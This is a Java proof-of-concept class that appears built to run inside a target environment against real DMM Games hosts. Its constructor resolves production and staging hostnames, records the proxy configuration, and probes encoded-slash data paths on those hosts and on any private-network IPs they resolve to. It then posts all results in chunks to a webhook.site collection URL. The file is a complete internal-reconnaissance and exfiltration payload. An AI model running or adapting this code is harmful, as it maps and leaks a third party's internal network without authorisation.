import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String[] HOSTS = {
        "api.abyss-prod-r18.dotabyss.dmmgames.com",
        "api.abyss-stg-r18.dotabyss.dmmgames.com",
        "api.abyss-stg-1-r18.dotabyss.dmmgames.com",
        "api.abyss-stg-2-r18.dotabyss.dmmgames.com",
        "abyss-stg.dotabyss.dmmgames.com",
        "api.abyss-review-2-r18.dotabyss.dmmgames.com",
        "api.abyss-review-1-r18.dotabyss.dmmgames.com",
        "memberapis.dmm.com",
        "api.games.dmm.com",
        "play.games.dmm.com",
        "mavenex.arms.dmm.com",
        "api.abyss-verdict-r18.dotabyss.dmmgames.com"
    };
    static final String[] PATHS = {"/data%2F90", "/data%2F270", "/data%2F256"};

    public poc() {
        StringBuilder sb = new StringBuilder("P14\n");
        String[] ips = new String[HOSTS.length];
        for (int i = 0; i < HOSTS.length; i++) {
            sb.append("\n@@DNS ").append(HOSTS[i]).append("\n");
            try {
                InetAddress[] all = InetAddress.getAllByName(HOSTS[i]);
                for (int j = 0; j < all.length; j++) {
                    sb.append("  ").append(all[j].getHostAddress()).append("\n");
                    if (j == 0) { ips[i] = all[j].getHostAddress(); }
                }
            } catch (Throwable t) { sb.append("  EXC ").append(t).append("\n"); }
        }
        sb.append("\nproxyHost=").append(System.getProperty("http.proxyHost")).append("\n");
        for (int i = 0; i < HOSTS.length; i++) {
            for (int p = 0; p < PATHS.length; p++) {
                sb.append(hit("https://" + HOSTS[i] + PATHS[p], HOSTS[i]));
            }
        }
        for (int i = 0; i < HOSTS.length; i++) {
            if (ips[i] != null && (ips[i].startsWith("172.") || ips[i].startsWith("10.") || ips[i].startsWith("192.168."))) {
                sb.append(hit("http://" + ips[i] + "/data%2F270", HOSTS[i]));
                sb.append(hit("http://" + ips[i] + "/data%2F90", HOSTS[i]));
            }
        }
        String data = sb.toString();
        for (int i = 0; i < data.length() && i < 2000000; i += 80000) {
            try { post("P14|" + i + "|" + data.substring(i, Math.min(data.length(), i + 80000))); }
            catch (Throwable t) { }
        }
    }

    static String hit(String u, String host) {
        StringBuilder r = new StringBuilder();
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(8000); c.setReadTimeout(12000);
            c.setInstanceFollowRedirects(false);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            c.setRequestProperty("Host", host);
            int code = c.getResponseCode();
            int len = c.getContentLength();
            r.append("  ").append(u).append(" -> ").append(code).append(" lenhdr=").append(len)
             .append(" ct=").append(c.getContentType()).append("\n");
            if (code == 200) {
                InputStream in = c.getInputStream();
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                byte[] b = new byte[8192]; int n; int tot = 0;
                while ((n = in.read(b)) > 0) { tot += n; if (bo.size() < 64) bo.write(b, 0, n); if (tot > 300000) break; }
                in.close();
                r.append("     OK len=").append(tot).append(" magic=").append(toHex(bo.toByteArray(), 8)).append("\n");
            }
        } catch (Throwable t) { r.append("  ").append(u).append(" EXC ").append(t).append("\n"); }
        return r.toString();
    }

    static String toHex(byte[] b, int n) {
        StringBuilder s = new StringBuilder();
        for (int i = 0; i < Math.min(b.length, n); i++) { s.append(String.format("%02x", b[i] & 0xff)); }
        return s.toString();
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
        try { c.getResponseCode(); } catch (Throwable t) { }
    }
}
